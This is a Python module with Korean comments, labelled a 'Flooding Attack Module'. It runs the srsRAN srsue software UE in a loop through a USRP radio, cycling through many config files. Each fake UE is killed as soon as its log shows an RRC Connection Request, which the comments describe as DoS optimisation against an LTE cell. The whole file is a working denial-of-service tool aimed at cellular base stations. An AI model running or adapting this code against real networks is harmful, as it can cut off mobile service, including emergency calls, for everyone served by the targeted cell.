#!/usr/bin/env python3
"""
Flooding Attack Module
config 파일들을 사용하여 공격을 실행하는 기능을 담당합니다.
"""

import subprocess
import time
import os
import sys
import logging
from typing import Optional

logger = logging.getLogger(__name__)


def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[str] = None) -> subprocess.Popen:
    """단일 config 파일로 srsue 실행"""
    # config 파일 경로를 절대 경로로 변환
    if not os.path.isabs(config_path):
        config_path = os.path.abspath(config_path)
    
    # config 파일 존재 확인
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config 파일을 찾을 수 없습니다: {config_path}")
    
    cmd = [
        "srsue",
        config_path,
        "--log.filename", log_file,
        "--log.all_level", "info"
    ]
    
    # device_args를 명령어 옵션으로 추가
    if usrp_args:
        cmd.extend(["--rf.device_args", usrp_args])
    
    kwargs = {
        'stdout': subprocess.PIPE,
        'stderr': subprocess.PIPE,
    }
    if hasattr(os, 'setsid'):
        kwargs['preexec_fn'] = os.setsid
    elif sys.platform == 'darwin':
        kwargs['start_new_session'] = False
    
    return subprocess.Popen(cmd, **kwargs)


def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None, running_flag=None):
    """
    config 파일들을 사용하여 공격을 실행합니다.
    
    Args:
        config_files: 공격에 사용할 config 파일 목록
        usrp_args: USRP 장치 인자
        running_flag: 실행 중 플래그 (None이면 계속 실행)
    """
    if not config_files:
        logger.error("config 파일이 없습니다!")
        return
    
    logger.info(f"{len(config_files)}개의 config 파일로 순차 공격 시작 (하나의 USRP 사용)...")
    logger.info("공격 모드: RRC Connection Request까지만 전송 후 즉시 종료 (DoS 최적화)")
    
    config_index = 0
    current_process = None
    process_start_time = None
    max_process_wait_time = 2.0  # 각 프로세스당 최대 2초 대기 (RRC Request만 보내고 종료)
    
    try:
        while running_flag is None or running_flag():
            # 현재 프로세스가 없거나 종료되었으면 다음 config 실행
            if current_process is None or current_process.poll() is not None:
                # 이전 프로세스가 있으면 정리
                if current_process and current_process.poll() is None:
                    try:
                        current_process.terminate()
                        current_process.wait(timeout=1)
                    except:
                        current_process.kill()
                
                # 다음 config 파일로 실행
                if config_index >= len(config_files):
                    # 모든 config를 다 사용했으면 처음부터 다시
                    config_index = 0
                
                config_path = config_files[config_index]
                log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
                
                try:
                    current_process = run_srsue_with_config(config_path, log_file, usrp_args)
                    process_start_time = time.time()
                    config_index += 1
                    if config_index % 50 == 0:
                        logger.info(f"진행 중... {config_index}/{len(config_files)} config 실행")
                except Exception as e:
                    logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
                    config_index += 1
                    continue
            
            # 타임아웃 확인
            if current_process and process_start_time:
                elapsed = time.time() - process_start_time
                if elapsed > max_process_wait_time:
                    # 타임아웃: 다음 config로 이동
                    if current_process.poll() is None:
                        current_process.terminate()
                        try:
                            current_process.wait(timeout=0.5)
                        except:
                            current_process.kill()
                    current_process = None
                    process_start_time = None
                    continue
            
            # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
            if current_process and os.path.exists(log_file):
                try:
                    with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                        log_content = f.read()
                    
                    # RRC Connection Request 전송 확인 (정확히 이것만 체크)
                    rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                        'rrc connection request',
                        'sending rrc connection request',
                        'rrc connection request sent'
                    ])
                    
                    # RACH 전송도 체크 (RRC Request 전 단계)
                    rach_sent = any(keyword in log_content.lower() for keyword in [
                        'random access',
                        'rach',
                        'preamble',
                        'sending rach'
                    ])
                    
                    # PBCH 디코딩 실패 확인
                    pbch_failed = 'could not decode pbch' in log_content.lower()
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    
                    # RRC Connection Request를 보냈으면 즉시 종료 (Setup은 무시)
                    if rrc_request_sent:
                        # RRC Request 전송 확인 → 즉시 종료하고 다음 UE로
                        if current_process.poll() is None:
                            current_process.terminate()
                            try:
                                current_process.wait(timeout=0.3)
                            except:
                                current_process.kill()
                        current_process = None
                        process_start_time = None
                        continue
                    elif rach_sent and elapsed > 0.5:
                        # RACH 전송 후 0.5초 지났으면 다음으로 (RRC Request가 곧 올 것)
                        if current_process.poll() is None:
                            current_process.terminate()
                            try:
                                current_process.wait(timeout=0.3)
                            except:
                                current_process.kill()
                        current_process = None
                        process_start_time = None
                        continue
                    elif pbch_failed and elapsed > 1.0:
                        # PBCH 디코딩 실패이고 1초 이상 지났으면 다음으로
                        if current_process.poll() is None:
                            current_process.terminate()
                            try:
                                current_process.wait(timeout=0.3)
                            except:
                                current_process.kill()
                        current_process = None
                        process_start_time = None
                        continue
                except:
                    pass
            
            # 짧은 대기 후 다시 확인
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        pass
    finally:
        # 정리
        if current_process and current_process.poll() is None:
            try:
                current_process.terminate()
                current_process.wait(timeout=1)
            except:
                current_process.kill()

